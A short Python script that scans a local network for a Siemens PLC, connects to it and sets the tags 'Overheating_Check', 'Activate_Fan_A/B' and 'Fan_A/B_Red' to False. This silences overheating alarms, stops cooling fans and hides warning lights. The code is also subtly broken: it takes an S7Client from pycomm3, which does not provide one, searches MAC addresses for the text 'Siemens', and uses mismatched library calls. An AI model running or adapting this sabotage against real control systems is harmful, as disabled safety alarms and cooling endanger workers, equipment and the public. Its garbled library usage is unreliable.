import pycomm3
from pycomm3 import LogixDriver, S7Client
from scapy.all import ARP, Ether, srp
import time

# Function to find the PLC's IP address
def find_plc_ip():
    # Define the target IP range to scan
    target_ip = "192.168.1.0/24"
    
    # Create an ARP request packet
    arp = ARP(pdst=target_ip)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether/arp
    
    # Send the packet and capture the response
    result = srp(packet, timeout=3, verbose=0)[0]
    
    # Parse the response to find the PLC's IP address
    for sent, received in result:
        if "Siemens" in received.hwsrc:
            return received.psrc
    return None

# Function to connect to the PLC
def connect_to_plc(ip_address):
    client = S7Client()
    client.connect(ip_address, 0, 1)
    return client

# Function to modify alarm settings
def modify_alarm_settings(client):
    # Example: Suppress the "Overheating_Check" alarm
    # Set the "Overheating_Check" tag to FALSE
    client.write_by_name("Overheating_Check", False)
    
    # Example: Suppress the "Activate_Fan_A" and "Activate_Fan_B" alarms
    # Set the "Activate_Fan_A" and "Activate_Fan_B" tags to FALSE
    client.write_by_name("Activate_Fan_A", False)
    client.write_by_name("Activate_Fan_B", False)
    
    # Example: Suppress the "Fan_A_Red" and "Fan_B_Red" indicator lights
    # Set the "Fan_A_Red" and "Fan_B_Red" tags to FALSE
    client.write_by_name("Fan_A_Red", False)
    client.write_by_name("Fan_B_Red", False)

# Function to disconnect from the PLC
def disconnect_from_plc(client):
    client.disconnect()

# Main function
def main():
    # Find the PLC's IP address
    plc_ip = find_plc_ip()
    if plc_ip is None:
        print("PLC not found on the network.")
        return
    
    print(f"PLC found at IP address: {plc_ip}")
    
    # Connect to the PLC
    client = connect_to_plc(plc_ip)
    if not client.get_connected():
        print("Failed to connect to the PLC.")
        return
    
    print("Connected to the PLC.")
    
    # Modify alarm settings
    modify_alarm_settings(client)
    print("Alarm settings modified.")
    
    # Disconnect from the PLC
    disconnect_from_plc(client)
    print("Disconnected from the PLC.")

if __name__ == "__main__":
    main()